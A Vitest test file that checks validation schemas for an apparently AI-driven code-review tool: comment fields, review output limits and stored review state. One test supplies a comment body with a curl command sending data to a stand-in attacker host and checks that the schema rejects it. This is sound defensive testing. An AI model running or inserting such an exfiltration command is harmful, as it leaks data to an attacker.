import { describe, expect, it } from 'vitest';
import {
  InlineCommentSchema,
  REVIEW_STATE_SCHEMA_VERSION,
  ReviewOutputSchema,
  ReviewStateSchema,
} from './schemas.js';

const validComment = {
  path: 'src/auth.ts',
  line: 10,
  side: 'RIGHT' as const,
  body: 'Avoid logging secrets. Use a redaction layer instead.',
  severity: 'major' as const,
  suggestion: 'logger.info({ user: user.id });',
};

describe('InlineCommentSchema', () => {
  it('accepts a well-formed comment', () => {
    expect(InlineCommentSchema.safeParse(validComment).success).toBe(true);
  });

  it('accepts comment without suggestion', () => {
    const { suggestion: _, ...withoutSuggestion } = validComment;
    expect(InlineCommentSchema.safeParse(withoutSuggestion).success).toBe(true);
  });

  it('rejects null suggestion (must be omitted, not null)', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, suggestion: null }).success).toBe(
      false,
    );
  });

  it('rejects non-positive line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 0 }).success).toBe(false);
    expect(InlineCommentSchema.safeParse({ ...validComment, line: -1 }).success).toBe(false);
  });

  it('rejects fractional line number', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 1.5 }).success).toBe(false);
  });

  it('rejects line numbers above 1_000_000', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, line: 1_000_001 }).success).toBe(false);
  });

  it('rejects unknown side value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, side: 'CENTER' }).success).toBe(false);
  });

  it('rejects unknown severity value', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, severity: 'blocker' }).success).toBe(
      false,
    );
  });

  it('rejects empty body', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, body: '' }).success).toBe(false);
  });

  it('rejects oversized body (>5000 chars)', () => {
    const huge = 'x'.repeat(5001);
    expect(InlineCommentSchema.safeParse({ ...validComment, body: huge }).success).toBe(false);
  });

  it('rejects path containing NUL byte', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: 'src/a\0.ts' }).success).toBe(
      false,
    );
  });

  it('rejects path > 500 chars', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: 'a'.repeat(501) }).success).toBe(
      false,
    );
  });

  it('rejects @everyone broadcast mention', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'Hey @everyone please look' }).success,
    ).toBe(false);
  });

  it('rejects @channel broadcast mention', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'Notify @channel about this' })
        .success,
    ).toBe(false);
  });

  it('rejects shell command (curl http) in body', () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        body: 'Run `curl http://attacker.example/leak`',
      }).success,
    ).toBe(false);
  });

  it('allows mentions of regular users', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, body: 'cc @alice — thoughts?' }).success,
    ).toBe(true);
  });

  it('allows curl mentioned without an HTTP URL', () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        body: 'Use curl to test this endpoint locally.',
      }).success,
    ).toBe(true);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, extra: 'oops' }).success).toBe(false);
  });

  it('rejects empty path', () => {
    expect(InlineCommentSchema.safeParse({ ...validComment, path: '' }).success).toBe(false);
  });

  it('rejects oversized suggestion (>5000 chars)', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, suggestion: 'x'.repeat(5001) }).success,
    ).toBe(false);
  });

  it('accepts comment without category (optional)', () => {
    const { category: _, ...withoutCategory } = { ...validComment, category: undefined };
    expect(InlineCommentSchema.safeParse(withoutCategory).success).toBe(true);
  });

  it('accepts each known category value', () => {
    for (const category of [
      'bug',
      'security',
      'performance',
      'maintainability',
      'style',
      'docs',
      'test',
    ] as const) {
      const severity = category === 'style' ? 'minor' : 'major';
      expect(InlineCommentSchema.safeParse({ ...validComment, severity, category }).success).toBe(
        true,
      );
    }
  });

  it('rejects unknown category value', () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'correctness' }).success,
    ).toBe(false);
  });

  it("rejects category='style' with severity='major'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'major' })
        .success,
    ).toBe(false);
  });

  it("rejects category='style' with severity='critical'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'critical' })
        .success,
    ).toBe(false);
  });

  it("accepts category='style' with severity='minor'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'minor' })
        .success,
    ).toBe(true);
  });

  it("accepts category='style' with severity='info'", () => {
    expect(
      InlineCommentSchema.safeParse({ ...validComment, category: 'style', severity: 'info' })
        .success,
    ).toBe(true);
  });

  it("accepts category='security' with severity='critical' (no cap on non-style)", () => {
    expect(
      InlineCommentSchema.safeParse({
        ...validComment,
        category: 'security',
        severity: 'critical',
      }).success,
    ).toBe(true);
  });
});

describe('ReviewOutputSchema', () => {
  it('accepts valid output with empty comments', () => {
    expect(ReviewOutputSchema.safeParse({ summary: 'No issues.', comments: [] }).success).toBe(
      true,
    );
  });

  it('accepts valid output with multiple comments', () => {
    expect(
      ReviewOutputSchema.safeParse({
        summary: 'Two issues identified.',
        comments: [validComment, { ...validComment, line: 20 }],
      }).success,
    ).toBe(true);
  });

  it('rejects empty summary', () => {
    expect(ReviewOutputSchema.safeParse({ summary: '', comments: [] }).success).toBe(false);
  });

  it('rejects oversized summary (>10000 chars)', () => {
    expect(
      ReviewOutputSchema.safeParse({ summary: 'x'.repeat(10_001), comments: [] }).success,
    ).toBe(false);
  });

  it('rejects more than 50 comments', () => {
    const many = Array.from({ length: 51 }, (_, i) => ({ ...validComment, line: i + 1 }));
    expect(ReviewOutputSchema.safeParse({ summary: 'Too many', comments: many }).success).toBe(
      false,
    );
  });

  it('accepts exactly 50 comments', () => {
    const fifty = Array.from({ length: 50 }, (_, i) => ({ ...validComment, line: i + 1 }));
    expect(ReviewOutputSchema.safeParse({ summary: 'OK', comments: fifty }).success).toBe(true);
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(
      ReviewOutputSchema.safeParse({ summary: 'ok', comments: [], extra: 'nope' }).success,
    ).toBe(false);
  });

  it('propagates per-comment validation failures', () => {
    expect(
      ReviewOutputSchema.safeParse({
        summary: 'ok',
        comments: [{ ...validComment, body: '@everyone' }],
      }).success,
    ).toBe(false);
  });
});

const validState = {
  schemaVersion: REVIEW_STATE_SCHEMA_VERSION,
  lastReviewedSha: '0123456789abcdef0123456789abcdef01234567',
  baseSha: 'fedcba9876543210fedcba9876543210fedcba98',
  reviewedAt: '2026-04-30T10:00:00.000Z',
  modelUsed: 'claude-sonnet-4-6',
  totalTokens: 12_345,
  totalCostUsd: 0.45,
  commentFingerprints: ['0123456789abcdef', 'fedcba9876543210'],
};

describe('ReviewStateSchema', () => {
  it('accepts a well-formed state', () => {
    expect(ReviewStateSchema.safeParse(validState).success).toBe(true);
  });

  it('accepts state with empty commentFingerprints array', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, commentFingerprints: [] }).success).toBe(
      true,
    );
  });

  it('rejects negative totalCostUsd', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, totalCostUsd: -0.01 }).success).toBe(false);
  });

  it('rejects negative totalTokens', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, totalTokens: -1 }).success).toBe(false);
  });

  it('rejects fractional totalTokens', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, totalTokens: 1.5 }).success).toBe(false);
  });

  it('rejects lastReviewedSha that is not a 40-char hex SHA', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, lastReviewedSha: 'abc' }).success).toBe(
      false,
    );
    expect(
      ReviewStateSchema.safeParse({
        ...validState,
        lastReviewedSha: 'GHIJKL6789abcdef0123456789abcdef01234567',
      }).success,
    ).toBe(false);
    expect(
      ReviewStateSchema.safeParse({
        ...validState,
        lastReviewedSha: '0123456789ABCDEF0123456789ABCDEF01234567',
      }).success,
    ).toBe(false);
  });

  it('rejects baseSha that is not a 40-char hex SHA', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, baseSha: 'def' }).success).toBe(false);
  });

  it('rejects schemaVersion mismatch (future v2)', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, schemaVersion: 2 }).success).toBe(false);
  });

  it('rejects schemaVersion as a non-numeric type', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, schemaVersion: '1' }).success).toBe(false);
  });

  it('rejects missing commentFingerprints', () => {
    const { commentFingerprints: _, ...withoutFingerprints } = validState;
    expect(ReviewStateSchema.safeParse(withoutFingerprints).success).toBe(false);
  });

  it('rejects commentFingerprints with the wrong shape', () => {
    expect(
      ReviewStateSchema.safeParse({ ...validState, commentFingerprints: ['short'] }).success,
    ).toBe(false);
    expect(
      ReviewStateSchema.safeParse({
        ...validState,
        commentFingerprints: ['0123456789ABCDEF'],
      }).success,
    ).toBe(false);
    expect(ReviewStateSchema.safeParse({ ...validState, commentFingerprints: [42] }).success).toBe(
      false,
    );
  });

  it('rejects non-ISO reviewedAt strings', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, reviewedAt: 'yesterday' }).success).toBe(
      false,
    );
  });

  it('rejects empty modelUsed', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, modelUsed: '' }).success).toBe(false);
  });

  it('rejects modelUsed longer than 128 chars', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, modelUsed: 'm'.repeat(129) }).success).toBe(
      false,
    );
  });

  it('rejects unknown extra fields (strict mode)', () => {
    expect(ReviewStateSchema.safeParse({ ...validState, extra: 'oops' }).success).toBe(false);
  });
});
